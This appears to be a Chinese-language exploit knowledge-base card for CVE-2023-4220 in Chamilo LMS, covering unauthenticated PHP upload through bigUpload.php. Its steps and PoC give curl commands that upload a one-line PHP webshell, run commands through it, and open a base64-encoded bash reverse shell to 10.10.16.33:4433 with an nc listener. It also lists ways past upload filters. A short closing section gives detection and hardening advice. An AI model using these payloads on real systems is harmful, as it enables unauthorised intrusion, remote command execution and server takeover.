---
id: web-php-rce-chamilo-bigupload-post-unsupported-php-upload-rce
title: Chamilo LMS bigupload 未授权上传 PHP 文件致 RCE（CVE-2023-4220）：action=post-unsupported 直接落地 files/ 目录
type: scenario
domain: web
path: web/php/rce
technique: chamilo-bigupload-unauth-file-upload-webshell
aliases:
- CVE-2023-4220
- Chamilo bigupload
- bigUpload.php action=post-unsupported
- /main/inc/lib/javascript/bigupload/files
- Chamilo 未授权上传
- eLearning 平台 getshell
tags:
- php
- chamilo
- file-upload
- arbitrary-file-write
- webshell
- rce
- unauthenticated
cve:
- CVE-2023-4220
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T2-1
  verified_at: '2026-11-07T23:05:26+08:00'
  notes: '已对照 content.md 与 img/08/09/10/11/15 核对：img/09 的 Index of /main/inc/lib/javascript/bigupload 列出 README.md/css/files/inc/js，img/08 README.md 显示 # Chamilo 1.11.x，img/10 curl -F bigUploadFile=@k.php action=post-unsupported 返回 The file has successfully been uploaded 且 files/k.php?cmd=id 回显 uid=33(www-data)，img/11 base64 反弹命令(base64 -w0 编码 bash -i >& /dev/tcp/10.10.16.33/4433 0>&1)与 img/12 nc 收到 www-data shell 均与卡内一致；CVE-2023-4220 归类为 Chamilo bigupload RCE 正确。未验证点：本机未复现，files/ 必须存在与未鉴权两点依原文公告/截图；affected_versions 原文仅给 README 的 Chamilo 1.11.x 线索(目标环境版本)，故未 set-versions。'
---

## 一句话结论

Chamilo LMS 的 `main/inc/lib/javascript/bigupload/inc/bigUpload.php` 在 `action=post-unsupported` 分支直接接收 multipart 字段 `bigUploadFile`，把文件按原始文件名保存进同级的 `files/` 目录，既不校验扩展名也不要求登录；攻击者上传 `k.php` 即得到一个可访问的 PHP WebShell，再用 `?cmd=` 参数执行命令（原文以此反弹 shell 并以 `www-data` 落地）。

## 原理

- **功能定位**：`bigupload` 是 Chamilo 早期用于大文件分块上传的前端组件，PHP 侧入口 `bigUpload.php` 通过 `action` 参数分流。`post-unsupported` 这个“不支持分块上传”的降级分支为了兼容浏览器直接提交整文件，实现上就是把 `$_FILES['bigUploadFile']['tmp_name']` 原名 `move_uploaded_file` 到 `files/` 下。
- **缺陷在于信任文件名**：落盘路径由客户端提交的文件名直接决定（原文描述为「可以控制给定的名称，因此它可以以 `.php` 结尾」），服务端没有扩展名白名单、没有 `Content-Type` 校验、也没有把上传目录放到 Web 根之外；同时该脚本位于 `main/inc/lib/javascript/` 这类“静态资源/库”路径下，被当作前端组件而缺少鉴权与 `isLoggedIn()` 校验，形成**未授权**写入。
- **为什么能直接执行**：`files/` 目录与脚本同属站点根下、由 Apache 直接对外提供，`.php` 后缀文件会被 PHP 解析器处理，因此上传的文件不是“被存储后由别的漏洞包含”，而是访问即执行——这条链的 RCE 是由「写入 WebShell + 直接请求」完成的。
- **前提目录存在**：原文特别指出 `main/inc/lib/javascript/bigupload/files` 必须已存在（否则 `move_uploaded_file` 失败）；实际部署中该目录常随组件安装存在，也可通过目录列举确认。
- **信息面**：该组件的 `README.md` 与目录列表会暴露产品与版本（原文即通过 `README.md` 读到 `Chamilo 1.11.x`、通过 `Index of /main/inc/lib/javascript/bigupload` 看到 `files/`），为定位利用路径提供直接线索。

## 触发条件

- 目标运行 Chamilo LMS，且 `main/inc/lib/javascript/bigupload/inc/bigUpload.php` 可未授权访问。
- 组件目录下 `files/` 子目录存在且 Web 进程用户可写（目录列举可确认）。
- Web 服务器把该目录下的 `.php` 交给 PHP 解析（Apache + mod_php / php-fpm 的常规配置均满足）。
- 上传接口没有扩展名/MIME 白名单，或白名单可被双扩展名、大小写、`Content-Type` 欺骗绕过。

## 利用步骤

1. 指纹与目录确认：nmap 识别 `Apache` + 站点标题，目录爆破或子域爆破拿到 `lms.<domain>`；访问 `/main/inc/lib/javascript/bigupload/` 确认目录可列举、`files/` 存在，并读取同目录 `README.md` 取得产品名与版本线索。
2. 准备最小 WebShell `k.php`（如 `<?php system($_GET['cmd']); ?>`）。
3. 用 multipart 向 `bigUpload.php?action=post-unsupported` 提交字段 `bigUploadFile`，文件名保持 `.php`：

   `curl -F 'bigUploadFile=@k.php' 'http://lms.example/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'`

   返回 `The file has successfully been uploaded.` 即表示落盘成功。
4. 直接请求 `http://lms.example/main/inc/lib/javascript/bigupload/files/k.php?cmd=id`，确认命令执行（原文回显 `uid=33(www-data) gid=33(www-data)`）。
5. 反弹 shell：把 `bash -i >& /dev/tcp/<ip>/<port> 0>&1` 之类的命令 base64 编码，通过 `cmd=echo+<base64>|base64+-d|bash` 交给 WebShell 执行，本机 `nc -lvp <port>` 收到连接。
6. 用 `script /dev/null -c bash`、`Ctrl-Z` + `stty raw -echo; fg` 把 shell 升级为可交互 TTY，为后续 `su`/`sudo` 做准备。

## PoC

```bash
# 1) 上传（字段名必须是 bigUploadFile，action 必须是 post-unsupported）
curl -F 'bigUploadFile=@k.php' \
  'http://lms.example/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
# → The file has successfully been uploaded.

# 2) 验证执行
curl 'http://lms.example/main/inc/lib/javascript/bigupload/files/k.php?cmd=id'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 3) 反弹 shell（本机先 nc -lvp 4433）
#    payload = base64("bash -i >& /dev/tcp/10.10.16.33/4433 0>&1")
curl 'http://lms.example/main/inc/lib/javascript/bigupload/files/k.php?cmd=echo+<BASE64>|base64+-d|bash'
```

`k.php` 内容（最小命令执行）：

```php
<?php system($_GET['cmd']); ?>
```

说明：`files/` 已被目录列举确认存在；若目标禁用了目录列举，可直接尝试访问 `files/` 路径判断 403/404。原文未给出 `.htaccess` 或 WAF 情况，若被拦截可尝试双扩展名 `k.php.jpg`、大小写 `k.PHP`、或改 `Content-Type`。

## 变体与关联

- 变体：`files/` 不存在时上传失败，可先用同组件的其它 `action`（如创建目录/分块写入）补齐，或改用站内其它任意写接口。
- 变体：若上传目录禁止执行 `php`（`.htaccess` 限制），可改为上传 `.htaccess` 重新开启解析，或上传 `.phtml/.phar` 等未被禁的后缀；也可把 WebShell 写入可被包含的路径配合 LFI。
- 变体：WebShell 不只是命令执行——原文引用的公告把它描述为「通过 webshell 的存储型 XSS 导致 RCE」，说明同一上传点还可作为存储型 XSS 的载荷宿主（上传 `.html/.svg` 在 `files/` 下被直接访问）。
- 关联：[[web-php-rce-greencms-elfinder-fileconnect-upload-put-webshell]]（同为「组件自带上传接口未鉴权/未校验后缀 → 落地 WebShell」，那条还有 `mkfile`+`put` 绕过 MIME 白名单的写法）、[[web-generic-file-upload-weak-suffix-bypass]]（弱后缀校验绕过的通用形态）、[[web-generic-file-upload-crond-path-traversal-rce]]（上传路径穿越写系统目录）。
- 边界：目标若把 `main/inc/lib/javascript/` 目录整体禁止执行、或 `files/` 权限收紧，这条链不成立；上传接口若在更新版本中加了 token 与扩展名白名单，需要另找写点。

## 检测与防御

- 检测（资产侧）：扫描 `/main/inc/lib/javascript/bigupload/` 是否可访问、`files/` 是否可列举、`README.md` 是否泄露版本；对 `bigUpload.php` 的 `action=post-unsupported` 请求与随后对 `files/*.php` 的 GET 建立关联告警。
- 检测（主机侧）：Web 目录下出现新增 `.php` 文件且 mtime 与上传请求时间吻合、Web 进程 spawn `bash`/`nc`/`base64` 子进程，是典型特征。
- 修复：升级 Chamilo 到修复版本；对 `bigupload` 接口加登录与 CSRF token 校验；落盘时强制扩展名/ MIME 白名单并重命名为随机名；把上传目录移出 Web 根或对该目录关闭 PHP 解析；禁止目录列举并移除随包 `README.md`。
- 加固：Web 根目录最小化、关闭不用的组件；对上传目录配置 `RemoveHandler`/`php_admin_flag engine off`；出网限制降低反弹 shell 成功率。
